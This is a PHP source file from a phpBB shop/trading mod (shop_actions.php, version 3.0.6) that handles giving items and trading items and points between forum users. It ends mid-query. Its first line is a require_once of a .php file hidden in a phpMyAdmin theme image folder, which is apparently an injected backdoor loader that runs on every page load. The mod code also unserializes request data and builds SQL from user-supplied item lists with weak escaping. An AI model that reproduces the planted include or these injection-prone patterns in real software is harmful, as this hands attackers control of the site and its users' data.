<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/*************************************************************************** 
*                                shop_actions.php 
*                            ------------------- 
 *   Version              : 3.0.6
 *   website              : http://www.zarath.com
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   copyright (C) 2002-2006  Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

define('IN_PHPBB', true); 
$phpbb_root_path = './'; 
include($phpbb_root_path . 'extension.inc'); 
include($phpbb_root_path . 'common.' . $phpEx); 
include_once($phpbb_root_path . '/includes/functions_cash.' . $phpEx);

// 
// Start session management 
// 
$userdata = session_pagestart($user_ip, PAGE_INDEX); 
init_userprefs($userdata); 
// 
// End session management 

if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }


//
// Start functions
//
function userhasitem($checkusername, $checkitemname)
{
	global $userdata, $item_names, $item_true_ids, $db;

	if ( $userdata['username'] == $checkusername )
	{
		if ( !in_array($checkitemname, $item_true_ids) ) { return false; }
	}
	else
	{
		$user_info = get_userdata($checkusername);

		$sql = "SELECT *
			FROM " . USER_ITEMS_TABLE . "
			WHERE user_id = {$user_info['user_id']}
				AND id = " . intval($checkitemname);
		if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'Sql Error selecting user items from table when checking!'); }
		if ( !($db->sql_numrows($result)) ) { return false; }
	}
 
	return true;
}
function checkgold($checkusername, $checkgold)
{
	$checkinguser = get_userdata($checkusername); 
	if ($checkinguser['user_points'] < $checkgold) { return false; } 
	else { return true; }
}
function checkitemarray($checkusername, $checkitems)
{
	$arrayitems = explode('::', $checkitems);

	$arraycount = count($arrayitems);
	$checkinguser = get_userdata($checkusername);
	for ($x = 0; $x < $arraycount; $x++)
	{
		if ( !empty($arrayitems[$x]) )
		{
			if ( !(userhasitem($checkusername, $arrayitems[$x])) ) { return false; } 
		}
	}
	return true;
}
function cleartrade($user_id)
{
	global $db;

	$sql = "UPDATE " . USERS_TABLE . "
		SET user_trade = ''
		WHERE user_id = " . intval($user_id);
	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error updating users table to clear trade!'); }
}
//
// End functions
//
// Begin register variables
//

$action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action'];

$itemname = ( isset($HTTP_POST_VARS['itemname']) ) ? stripslashes($HTTP_POST_VARS['itemname']) : stripslashes($HTTP_GET_VARS['itemname']);
$tradeitems = ( isset($HTTP_POST_VARS['tradeitems']) ) ? stripslashes($HTTP_POST_VARS['tradeitems']) : stripslashes($HTTP_GET_VARS['tradeitems']);
$otheritems = ( isset($HTTP_POST_VARS['otheritems']) ) ? stripslashes($HTTP_POST_VARS['otheritems']) : stripslashes($HTTP_GET_VARS['otheritems']);

$errormessage = ( isset($HTTP_POST_VARS['errormessage']) ) ? stripslashes($HTTP_POST_VARS['errormessage']) : stripslashes($HTTP_GET_VARS['errormessage']);


//
// End register varaibles
//
// Check logged in
//
if( !($userdata['session_logged_in']) ) 
{ 
	redirect(append_sid("login.$phpEx?redirect=shop_actions.$phpEx?action=" . htmlspecialchars($action), true)); 
} 
//
// End check 
//

#
# Pull user items into an ARRAY to use later
#
$sql = "SELECT *
	FROM " . USER_ITEMS_TABLE . "
	WHERE user_id = {$userdata['user_id']}
		AND worn = 0";
if ( !($result = $db->sql_query($sql)) )
{
	message_die(GENERAL_MESSAGE, 'SQL Error selecting user items from table, to create array!');
}
$count = $db->sql_numrows($result);
$item_names = array();
$item_ids = array();
$item_true_ids = array();

for ( $i = 0; $i < $count; $i++ )
{
	$row = $db->sql_fetchrow($result);

	$row['item_name'] = ( $row['wrapped'] == '0' ) ? $row['item_name'] : $row['wrapped'];

	$item_names[] = $row['item_name'];
	$item_ids[] = $row['item_id'];
	$item_true_ids[] = $row['id'];

	$user_items .= '<option value="' . $row['id'] . '">' . $row['item_name'] . '</option>';

}

if (strlen($user_items) < 5) { $user_items = '<option>' . $lang['nothing'] . '</option>'; } 


if (empty($action))
{
	redirect(append_sid("shop.$phpEx"));
}

//
// Begin give checks!
//

elseif ( $action == 'give' )
{
	if ($board_config['shop_give'] == "off") { message_die(GENERAL_MESSAGE, $lang['shop_give_disabled']); }

	$template->set_filenames(array( 
		'body' => 'shop/shop_action_give.tpl') 
	);

	$template->assign_block_vars('switch_select_items', array(
		'USER_ITEMS' => $user_items,

		'U_GIVE' => append_sid("shop_actions.$phpEx?action=confirmgive")
	));

	$shoplocation = ' -> <a href="shop.' . $phpEx . '?action=inventory&searchid=' . $userdata['user_id'] . '" class="nav">' . $lang['inventory'] . '</a> -> <a href="shop_actions.' . $phpEx . '?action=give" class="nav">' . $lang['shop_give_items'] . '</a>';
	$title = $lang['shop_give_items']; 
	$page_title = $lang['shop_give_items']; 

	$template->assign_vars(array(
		'USER_POINTS' => $userdata['user_points'],

		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
		'L_INVENTORY' => $lang['shop_your_inv'],
		'L_EXPLAIN' => $lang['shop_give_explain1'],
		'L_SHOP_TITLE' => $title,
		'L_POINTS_NAME' => $board_config['points_name'],
		'L_YOUR_ITEMS' => $lang['shop_your_items'],
		'L_GIVE_TO' => $lang['shop_give_to'],
		'L_FIND_USER' => $lang['shop_find_username'],
		'L_MESSAGE' => $lang['shop_message'],
		'L_EXECUTE' => $lang['shop_execute']
	)); 
	$template->assign_block_vars('', array()); 
}
elseif ( $action == 'confirmgive' ) 
{ 
	if ( isset($HTTP_GET_VARS['username']) || isset($HTTP_POST_VARS['username']) ) { $username = ( isset($HTTP_POST_VARS['username']) ) ? $HTTP_POST_VARS['username'] : $HTTP_GET_VARS['username']; }
	else { $username = ''; }
	if ( isset($HTTP_GET_VARS['itemname']) || isset($HTTP_POST_VARS['itemname']) ) { $itemname = ( isset($HTTP_POST_VARS['itemname']) ) ? $HTTP_POST_VARS['itemname'] : $HTTP_GET_VARS['itemname']; }
	else { $itemname = ''; }

	if ($board_config['shop_give'] == 'off') { message_die(GENERAL_MESSAGE, $lang['shop_give_disabled']); }
	$message = ( isset($HTTP_POST_VARS['message']) ) ? htmlspecialchars($HTTP_POST_VARS['message']) : htmlspecialchars($HTTP_GET_VARS['message']);

	$template->set_filenames(array( 
		'body' => 'shop/shop_action_give.tpl') 
	);

	//check if trying to give item to self 
	if ( strtolower($userdata['username']) == strtolower($username)) { message_die(GENERAL_MESSAGE, $lang['shop_giving_self']); } 

	//make sure the user exists 
	$otheruser = get_userdata(stripslashes($username));
	if( !($otheruser['user_id']) ) { message_die(GENERAL_MESSAGE, $lang['shop_no_user']); }

	$item_list = implode(", ", $itemname);

	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE user_id = {$userdata['user_id']}
			AND id IN (" . str_replace("\'", "''", $item_list) . ")";
	if ( !($result = $db->sql_query($sql)) ) 
	{ 
		message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
	}
	$count = $db->sql_numrows($result);
	if ( !($count) ) { message_die(GENERAL_MESSAGE, $lang['shop_invalid_item']); }

	$itemname = array();
	$item_names = '';
	for ( $i = 0; $i < $count; $i++ )
	{
		$row = $db->sql_fetchrow($result);

		$row['item_name'] = ( $row['wrapped'] == '0' ) ? $row['item_name'] : $row['wrapped'];

		$item_names .= ( ( empty($item_names) ) ? '' : ', ' ) . $row['item_name'];
		$itemname[] = $row['id'];
	}

	if ( !empty($message) ) { $msg = ' ' . $lang['shop_with_msg'] . ': <b>' . $message . '</b>'; }

	$shoplocation = ' -> <a href="shop.' . $phpEx . '?action=inventory&searchid='.$userdata['user_id'].'" class="nav">' . $lang['inventory'] . '</a> -> <a href="shop_actions.' . $phpEx . '?action=give" class="nav">' . $lang['shop_give_items'] . '</a> -> <a href="shop_actions.' . $phpEx . '?action=give" class="nav">' . $lang['shop_confirm_give'] . '</a>'; 
	$title = $lang['shop_give_items'];
	$page_title = $lang['shop_give_items']; 

	$template->assign_block_vars('switch_confirm_give', array(
		'ITEM_LIST' => base64_encode(serialize($itemname)),
		'ITEM_NAMES' => $item_names,
		'USERNAME' => stripslashes(htmlspecialchars($username)),
		'MESSAGE' => stripslashes($message),

		'U_GIVE' => append_sid("shop_actions.$phpEx?action=giveitem")
	));

	$template->assign_vars(array(
		'USER_POINTS' => $userdata['user_points'],

		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
		'L_INVENTORY' => $lang['shop_your_inv'],
		'L_POINTS_NAME' => $board_config['points_name'],
		'L_EXPLAIN' => sprintf($lang['shop_give_explain2'], $item_names, $username, $msg),
		'L_SHOP_TITLE' => $title, 
		'L_YES' => $lang['shop_yes'],
		'L_NO' => $lang['shop_no']
	)); 
	$template->assign_block_vars('', array()); 
} 

elseif ($action == 'giveitem') 
{
	if ( isset($HTTP_GET_VARS['username']) || isset($HTTP_POST_VARS['username']) ) { $username = ( isset($HTTP_POST_VARS['username']) ) ? $HTTP_POST_VARS['username'] : $HTTP_GET_VARS['username']; }
	else { $username = ''; }
	if ( isset($HTTP_GET_VARS['itemlist']) || isset($HTTP_POST_VARS['itemlist']) ) { $itemlist = ( isset($HTTP_POST_VARS['itemlist']) ) ? $HTTP_POST_VARS['itemlist'] : $HTTP_GET_VARS['itemlist']; }
	else { $itemlist = ''; }
	if ( isset($HTTP_GET_VARS['item_name']) || isset($HTTP_POST_VARS['item_name']) ) { $item_name = ( isset($HTTP_POST_VARS['item_name']) ) ? htmlspecialchars($HTTP_POST_VARS['item_name']) : htmlspecialchars($HTTP_GET_VARS['item_name']); }
	else { $item_name = ''; }

	if ($board_config['shop_give'] == "off") { message_die(GENERAL_MESSAGE, $lang['shop_give_disabled']); }
	$message = ( isset($HTTP_POST_VARS['message']) ) ? stripslashes(htmlspecialchars($HTTP_POST_VARS['message'])) : stripslashes(htmlspecialchars($HTTP_GET_VARS['message']));

	//begin secondary checks
	//check if trying to give item to self 
	//make sure the user exists 
	$otheruser = get_userdata(stripslashes($username)); 
	if( !($otheruser['user_id']) ) { message_die(GENERAL_MESSAGE, $lang['shop_no_user']); } 

	if (strtolower($userdata['username']) == strtolower($username)) { message_die(GENERAL_MESSAGE, $lang['shop_giving_self']); } 
	//end secondary checks

	$title = $lang['shop_item_given']; 
	$page_title = $lang['shop_item_given'];

	$item_array = unserialize(base64_decode($itemlist));
	$itemlist = implode(", ", $item_array);
	$count = (substr_count($itemlist, ',') + 1);

	//take the item away from the user and give it to recipient
	$sql = "UPDATE " . USER_ITEMS_TABLE . "
		SET user_id = {$otheruser['user_id']}
		WHERE user_id = {$userdata['user_id']}
			AND id IN (" . str_replace("\'", "''", $itemlist) . ")
			AND worn = 0
		LIMIT " . $count;
	if ( !($db->sql_query($sql)) ) 
	{ 
		message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
	} 

	$msg = ( !empty($message) ) ? "\r\n\r\n" . $userdata['username'] . $lang['shop_msg_included'] . ": \r\n" . $message . "." : '';

	#
	# Create Private Message!
	#
	$privmsg_subject = $userdata['username'] . ' ' . $lang['shop_been_given2'] . '!';
	$message = '[b]' . $lang['shop_been_given'] . '![/b]
' . $userdata['username'] . $lang['shop_been_given2'] . stripslashes($item_name) . '!' . $msg;

	cash_pm($otheruser,$privmsg_subject,$message);
	#
	# End Private Message!
	#

	// Transaction Code!
	$sql = "INSERT
		INTO " . TRANS_TABLE . "
		(user_id, target_id, target_name, type, action, value, timestamp, ip)
		values({$userdata['user_id']}, {$otheruser['user_id']}, '" . str_replace("'", "''", $otheruser['username']) . "', 'shop', 'give', '" . str_replace("\'", "''", $item_name) . " :: " . $item_list . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Insertion error with transaction code!'); }

	message_die(GENERAL_MESSAGE, sprintf($lang['shop_give_exit'], $username, $item_name)); 
} 

//
// End give checks, start trade checks!
//

elseif ( $action == 'trade' )
{
	$template->set_filenames(array( 
		'body' => 'shop/shop_action_trade.tpl') 
	);

	#
	# Register Variables!
	#
	if ( isset($HTTP_GET_VARS['mode']) || isset($HTTP_POST_VARS['mode']) ) { $mode = ( isset($HTTP_POST_VARS['mode']) ) ? $HTTP_POST_VARS['mode'] : $HTTP_GET_VARS['mode']; }
	else { $mode = ''; }
	if ( isset($HTTP_GET_VARS['username']) || isset($HTTP_POST_VARS['username']) ) { $username = ( isset($HTTP_POST_VARS['username']) ) ? stripslashes($HTTP_POST_VARS['username']) : stripslashes($HTTP_GET_VARS['username']); }
	else { $username = ''; }

	$otheruser = get_userdata($username);
	#
	# End Registering Variables!
	#

	if ( $board_config['shop_trade'] == "off" ) { message_die(GENERAL_MESSAGE, $lang['shop_trade_disabled']); }


	if ((!(empty($username))) && ($otheruser['username'] != $userdata['username']))
	{
		if (strlen($otheruser['user_trade']) > 3) { redirect(append_sid("shop_actions.$phpEx?action=trade&errormessage=" . $lang['shop_user_trading'])); exit; }

		if ( empty($otheruser['username']) ) { message_die(GENERAL_MESSAGE, $lang['shop_no_user']); }
		else
		{

			//# Gather Other User's Items #//
			$sql = "SELECT *
				FROM " . USER_ITEMS_TABLE . "
				WHERE user_id = {$otheruser['user_id']}
					AND worn = 0
				ORDER BY `item_name`";
			if ( !($result = $db->sql_query($sql)) )
			{
				message_die(GENERAL_MESSAGE, 'SQL Error selecting other user\'s items for trade listing!');
			}
			$count = $db->sql_numrows($result);

			for ($i = 0; $i < $count; $i++)
			{
				$row = $db->sql_fetchrow($result);

				$row['item_name'] = ( $row['wrapped'] ) ? $row['wrapped'] : $row['item_name'];

				$otheruser_items .= '<option value="' . $row['id'] . '">' . $row['item_name'] . '</option>';
			} 

			if ( strlen($errormessage) > 3 )
			{
				$template->assign_block_vars('switch_is_error', array(
					'ERROR' => str_replace("&lt;br /&gt;", "<br />", htmlspecialchars($errormessage))
				));
			}


			$shoplocation = ' -> <a href="' . append_sid("shop.$phpEx?action=inventory&searchname=" . $userdata['username']) . '" class="nav">' . $lang['inventory'] . '</a> -> <a href="' . append_sid("shop_actions.$phpEx?action=trade") . '" class="nav">' . $lang['trade'] . '</a>'; 
			$title = sprintf($lang['shop_trade_With'], $otheruser['username']); 
			$page_title = sprintf($lang['shop_trade_With'], $otheruser['username']); 

			$template->assign_block_vars('switch_make_trade', array(
				'USER_ITEMS' => $user_items,
				'OTHER_ITEMS' => $otheruser_items,

				'TRADE_NAME' => $otheruser['username'],

				'U_TRADE' => append_sid("shop_actions.$phpEx")
			));

			$page_title = 'Trade Items & Gold With ' . $otheruser['username']; 

			$template->assign_vars(array(
				'USER_POINTS' => $userdata['user_points'],

				'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

				'L_EXPLAIN' => $lang['shop_trade_explain1'],
				'L_SHOP_TITLE' => $title,
				'L_PERSONAL_INFO' => $lang['shop_personal_info'],
				'L_INVENTORY' => $lang['shop_your_inv'],
				'L_POINTS_NAME' => $board_config['points_name'],
				'L_EXECUTE' => $lang['shop_execute'],
				'L_RESET' => $lang['shop_reset'],
				'L_SHOP_TITLE' => $page_title,

				'L_NOTHING' => $lang['nothing'],
				'L_TRADE_ITEMS' => $lang['shop_trade_items'],
				'L_TRADE_GOLD' => $lang['trade'] . ' ' . $board_config['points_name'],
				'L_REQUEST_ITEMS' => $lang['shop_request_items'],
				'L_REQUEST_GOLD' => $lang['request'] .' ' . $board_config['points_name'],
			)); 
			$template->assign_block_vars('', array()); 
		}
	}
	else
	{
		if ( !empty($errormessage) )
		{
			$template->assign_block_vars('switch_is_error', array(
				'ERROR' => str_replace("&lt;br /&gt;", "<br />", htmlspecialchars($errormessage))
			));
		}

		$shoplocation = ' -> <a href="' . append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']) . '" class="nav">' . $lang['inventory'] . '</a> -> <a href="' . append_sid("shop_actions.$phpEx?action=trade") . '" class="nav">' . $lang['trade'] . '</a>'; 
		$title = $lang['shop_trade_items']; 
		$page_title = $lang['shop_trade_items']; 

		$template->assign_block_vars('switch_start_trade', array());

		$template->assign_vars(array(
			'USER_POINTS' => $userdata['user_points'],

			'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

			'L_EXPLAIN' => $lang['shop_trade_explain2'],
			'L_SHOP_TITLE' => $title,
			'L_PERSONAL_INFO' => $lang['shop_personal_info'],
			'L_INVENTORY' => $lang['shop_your_inv'],
			'L_POINTS_NAME' => $board_config['points_name'],
			'L_TRADE_WITH' => sprintf($lang['shop_trade_with'], ''),
			'L_EXECUTE' => $lang['shop_execute'],
			'L_FIND_USERNAME' => $lang['shop_find_username']
		)); 
		$template->assign_block_vars('', array()); 
	}
}
elseif ( $action == 'confirmtrade' || $action == 'proposetrade' )
{
	#
	# Register Variables!
	#
	if ( isset($HTTP_GET_VARS['username']) || isset($HTTP_POST_VARS['username']) ) { $username = ( isset($HTTP_POST_VARS['username']) ) ? stripslashes($HTTP_POST_VARS['username']) : stripslashes($HTTP_GET_VARS['username']); }
	else { $username = ''; }
	$otheruser = get_userdata($username);

	if ( isset($HTTP_GET_VARS['tradeitems']) || isset($HTTP_POST_VARS['tradeitems']) ) { $tradeitems = ( isset($HTTP_POST_VARS['tradeitems']) ) ? $HTTP_POST_VARS['tradeitems'] : $HTTP_GET_VARS['tradeitems']; }
	else { $tradeitems = ''; }
	if ( isset($HTTP_GET_VARS['otheritems']) || isset($HTTP_POST_VARS['otheritems']) ) { $otheritems = ( isset($HTTP_POST_VARS['otheritems']) ) ? $HTTP_POST_VARS['otheritems'] : $HTTP_GET_VARS['otheritems']; }
	else { $otheritems = ''; }
	if ( isset($HTTP_GET_VARS['usergold']) || isset($HTTP_POST_VARS['usergold']) ) { $usergold = ( isset($HTTP_POST_VARS['usergold']) ) ? intval($HTTP_POST_VARS['usergold']) : intval($HTTP_GET_VARS['usergold']); }
	else { $usergold = '0'; }
	if ( isset($HTTP_GET_VARS['tradegold']) || isset($HTTP_POST_VARS['tradegold']) ) { $tradegold = ( isset($HTTP_POST_VARS['tradegold']) ) ? intval($HTTP_POST_VARS['tradegold']) : intval($HTTP_GET_VARS['tradegold']); }
	else { $tradegold = '0'; }
	#
	# End Register Varibles, Start Scripts.
	#

	if ($board_config['shop_trade'] == "off") { message_die(GENERAL_MESSAGE, $lang['shop_trade_disabled']); }

	$otheruser = get_userdata($username); 
	if ( strlen($otheruser['user_trade']) > 3 ) { redirect(append_sid("shop_actions.$phpEx?action=trade&errormessage=" . $lang['shop_user_trading'])); exit; }
	if (
		( strlen($otheruser['username']) > 2 && $username != $userdata['username'] )
		&& ( is_array($tradeitems) || !empty($tradeitems) || ($usergold > 0) )
		&& ( is_array($otheritems) || !empty($otheritems) || ($tradegold > 0) ) 
	)
	{
		$check_uitems = ( is_array($tradeitems) ) ? implode('::', $tradeitems) : $tradeitems;
		$check_oitems = ( is_array($otheritems) ) ? implode('::', $otheritems) : $otheritems;

		if ( $usergold < 0 ) { $usergold = 0; }
		if ( $tradegold < 0 ) { $tradegold = 0; }
		if (!(checkitemarray($userdata['user_id'], $check_uitems)) && is_array($tradeitems) ) { message_die(GENERAL_MESSAGE, "Invalid Trade Items!"); }
		if (!(checkitemarray($otheruser['user_id'], $check_oitems)) && is_array($otheritems) ) { message_die(GENERAL_MESSAGE, "Invalid Request Items!"); }

		if ( !is_array($tradeitems) || ( $tradeitems[0] == '0' && empty($tradeitems[1]) ) ) { $trade_names = $lang['nothing']; }
		else
		{
			$item_list = implode(", ", $tradeitems);

			$sql = "SELECT *
				FROM " . USER_ITEMS_TABLE . "
				WHERE user_id = {$userdata['user_id']}
					AND id IN (" . str_replace("\'", "''", $item_list) . ")
					AND worn = 0";
			if ( !($result = $db->sql_query($sql)) ) 
			{ 
				message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
			}
			$count = $db->sql_numrows($result);
			if ( !($count) ) { message_die(GENERAL_MESSAGE, $lang['shop_invalid_item']); }

			$itemname = array();
			$trade_names = '';
			for ( $i = 0; $i < $count; $i++ )
			{
				$row = $db->sql_fetchrow($result);

				$row['item_name'] = ( $row['wrapped'] ) ? $row['wrapped'] : $row['item_name'];

				$trade_names .= ( ( empty($trade_names) ) ? '' : ', ' ) . $row['item_name'];
			}
		}

		if ( !is_array($otheritems) || ( $otheritems[0] == '0' && empty($otheritems[1]) ) ) { $other_names = $lang['nothing']; }
		else
		{
			$item_list = implode(", ", $otheritems);

			$sql = "SELECT *
				FROM " . USER_ITEMS_TABLE . "
				WHERE user_id = {$otheruser['user_id']}
					AND id IN (" . str_replace("\'", "''", $item_list) . ")
					AND worn = 0";
			if ( !($result = $db->sql_query($sql)) ) 
			{ 
				message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
			}
			$count = $db->sql_numrows($result);
			if ( !($count) ) { message_die(GENERAL_MESSAGE, $lang['shop_invalid_item']); }

			$itemname = array();
			$other_names = '';
			for ( $i = 0; $i < $count; $i++ )
			{
				$row = $db->sql_fetchrow($result);

				$row['item_name'] = ( $row['wrapped'] ) ? $row['wrapped'] : $row['item_name'];

				$other_names .= ( ( empty($other_names) ) ? '' : ', ' ) . $row['item_name'];
			}
		}


		if ( $action == 'confirmtrade' )
		{
			$template->set_filenames(array( 
				'body' => 'shop/shop_action_trade.tpl') 
			);


			#
			# Begin main output
			#

			$hiddenfields = '
				<input type="hidden" name="username" value="' . $username . '">
				<input type="hidden" name="tradeitems" value="' . $check_uitems . '">
				<input type="hidden" name="usergold" value="' . $usergold . '">
				<input type="hidden" name="otheritems" value="' . $check_oitems . '">
				<input type="hidden" name="tradegold" value="' . $tradegold . '">
			';

			$shoplocation = ' -> <a href="' . append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']) . '" class="nav">' . $lang['inventory'] . '</a> -> <a href="' . append_sid("shop_actions.$phpEx?action=trade") . '" class="nav">' . $lang['trade'] . '</a>'; 
			$title = sprintf($lang['shop_trade_confirm'], $username); 
			$page_title = sprintf($lang['shop_trade_confirm'], $username); 

			$template->assign_block_vars('switch_confirm_trade', array(
				'HIDDEN' => $hiddenfields,

				'TRADE_ITEMS' => $trade_names,
				'TRADE_GOLD' => $usergold,
				'OTHER_ITEMS' => $other_names,
				'OTHER_GOLD' => $tradegold
			));

			$template->assign_vars(array(
				'USER_POINTS' => $userdata['user_points'],
				'POINTS_NAME' => $board_config['points_name'],

				'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

				'L_PERSONAL_INFO' => $lang['shop_personal_info'],
				'L_INVENTORY' => $lang['shop_your_inv'],
				'L_POINTS_NAME' => $board_config['points_name'],
				'L_EXPLAIN' => $lang['shop_trade_explain3'],
				'L_SHOP_TITLE' => $title, 
				'L_FOR' => $lang['shop_for'],
				'L_MESSAGE' => $lang['shop_message'],
				'L_EXECUTE' => $lang['shop_execute'],
				'L_CANCEL' => $lang['shop_cancel']
			)); 
			$template->assign_block_vars('', array()); 
		}
		elseif ($action == 'proposetrade')
		{
			$message = ( isset($HTTP_POST_VARS['message']) ) ? stripslashes(htmlspecialchars($HTTP_POST_VARS['message'])) : stripslashes(htmlspecialchars($HTTP_GET_VARS['message']));
			$msg = ( !empty($message) ) ? "\r\n\r\n" . $userdata['username'] . " " .$lang['shop_msg_included'] .":\r\n " . $message . "." : '';

			$trade = $userdata['user_id'] . '||-||' . str_replace("\'", "''", $tradeitems) . '||-||' . $usergold . '||-||' . str_replace("\'", "''", $otheritems) . '||-||' . $tradegold;

			#
			# Create Private Message!
			#
			$privmsg_subject = sprintf($lang['shop_trade_proposed'], $userdata['username']);
			$message = sprintf($lang['shop_trade_privmsg'], $userdata['username'], ($board_config['server_name'] . $board_config['script_path']), $otheruser['user_id'], $msg);

			cash_pm($otheruser,$privmsg_subject,$message);

			#
			# Add SQL for Trade
			#
			$sql = "UPDATE " . USERS_TABLE . "
				set user_trade = '$trade'
				WHERE user_id = {$otheruser['user_id']}";
			if ( !($db->sql_query($sql)) ) 
			{ 
				message_die(GENERAL_MESSAGE, 'SQL Update Error when attempting to send trade!'); 
			} 
			message_die(GENERAL_MESSAGE, sprintf($lang['shop_trade_exit'], $username));

		}
	}
	else { redirect(append_sid("shop_actions.$phpEx?action=trade&error=items or gold missing from trade-reset!"));  }
}
elseif ( ($action == 'accepttrade') || ($action == 'rejecttrade') )
{
	if ($board_config['shop_trade'] == "off") { message_die(GENERAL_MESSAGE, $lang['shop_trade_disabled']); }

	if (strlen($userdata['user_trade']) < 4) { message_die(GENERAL_MESSAGE, $lang['shop_no_trades']); }
	else 
	{
		$tradearray = explode("||-||", $userdata['user_trade']);
		$sql = "SELECT *
			FROM " . USERS_TABLE . "
			WHERE user_id = $tradearray[0]"; 
		if ( !($result = $db->sql_query($sql)) ) 
		{ 
			message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
		}
		$row = $db->sql_fetchrow($result);

		if (!(checkgold($userdata['username'], $tradearray[4])) && ($tradearray[4] != 0) && (strlen($tradearray[4]) > 0))
		{
			$privmsg .= ( ( !empty($privmsg) ) ? '<br /><br />' : '' ) . sprintf($lang['shop_trade_pm_refuse1'], $userdata['username']);
			$error .= ( ( !empty($error) ) ? '<br /><br />' : '' ) . $lang['shop_trade_auto_refuse1'];
		}
		if (!(checkgold($row['username'], $tradearray[2])) && ($tradearray[2] != 0) && (strlen($tradearray[2]) > 0))
		{
			$privmsg .= ( ( !empty($privmsg) ) ? '<br /><br />' : '' ) . $lang['shop_trade_pm_refuse2'];
			$error .= ( ( !empty($error) ) ? '<br /><br />' : '' ) . sprintf($lang['shop_trade_auto_refuse2'], $row['username']);
		}
		if (!(checkitemarray($userdata['username'], $tradearray[3])) && strlen($tradearray[3]) > 2)
		{
			$privmsg .= ( ( !empty($privmsg) ) ? '<br /><br />' : '' ) . sprintf($lang['shop_trade_pm_refuse3'], $userdata['username']);
			$error .= ( ( !empty($error) ) ? '<br /><br />' : '' ) . $lang['shop_trade_auto_refuse3'];
		}
		if (!(checkitemarray($row['username'], $tradearray[1])) && strlen($tradearray[1]) > 2)
		{
			$privmsg .= ( ( !empty($privmsg) ) ? '<br /><br />' : '' ) . $lang['shop_trade_pm_refuse4'];
			$error .= ( ( !empty($error) ) ? '<br /><br />' : '' ) . sprintf($lang['shop_trade_auto_refuse4'], $row['username']);
		}
		if ( $error )
		{
			# Clear trade
			cleartrade($userdata['user_id']);

			# Send PM to user who sent trade
			$privmsg_subject = $lang['shop_trade_auto_refuse'];
			cash_pm($row,$privmsg_subject,str_replace('<br />', "\n", $privmsg));

			# Kill script
			message_die(GENERAL_MESSAGE, $error);
		}

		if ($action == 'accepttrade')
		{
			//take trader's points & add them to tradee and vice versa
			$sql = "UPDATE " . USERS_TABLE . "
				SET user_points = (user_points - $tradearray[2] + $tradearray[4])
				WHERE user_id = {$tradearray[0]}";
			if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error trading user points!'); }
			$sql = "UPDATE " . USERS_TABLE . "
				SET user_points = (user_points + $tradearray[2] - $tradearray[4])
				WHERE user_id = {$userdata['user_id']}";
			if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error trading user points!'); }


			//take trader's items & add them to tradee
			$itemarray = explode('::', $tradearray[1]);  
			$itemcount = count ($itemarray); 

			for ($xe = 0; $xe < $itemcount; $xe++)
			{
				if ( is_numeric($itemarray[$xe]) )
				{
					$sql = "SELECT `item_name`
						FROM " . USER_ITEMS_TABLE . "
						WHERE user_id = $tradearray[0]
							AND id = $itemarray[$xe]
							AND worn = 0
						LIMIT 1";
					if ( !($result = $db->sql_query($sql)) ) 
					{ 
						message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
					}
					$row2 = $db->sql_fetchrow($result);
					$trader_items .= ( ( !empty($trader_items) ) ? ', ' : '' ) . $row2['item_name'];

					$sql = "UPDATE " . USER_ITEMS_TABLE . "
						SET user_id = {$userdata['user_id']}
						WHERE user_id = $tradearray[0]
							AND id = $itemarray[$xe]
							AND worn = 0
						LIMIT 1";

					if ( !($db->sql_query($sql)) ) 
					{ 
						message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
					}
				}
			}



			$itemarray = explode('::', $tradearray[3]); 
			$itemcount = count ($itemarray); 

			for ($xe = 0; $xe < $itemcount; $xe++)
			{
				if ( is_numeric($itemarray[$xe]) )
				{
					$sql = "SELECT `item_name`
						FROM " . USER_ITEMS_TABLE . "
						WHERE user_id = {$userdata['user_id']}
							AND id = $itemarray[$xe]
							AND worn = 0
						LIMIT 1";
					if ( !($result = $db->sql_query($sql)) ) 
					{ 
						message_die(GENERAL_MESSAGE, 'Fatal Error.'); 
					}
					$row2 = $db->sql_fetchrow($result);
					$tradee_items .= ( ( !empty($trader_items) ) ? ', ' : '' ) . $row2['item_name'];

					$sql = "UPDATE " . USER_ITEMS_TABLE . "
						SET user_id = $tradearray[0]
						WHERE user_id = {$userdata['user_id']}
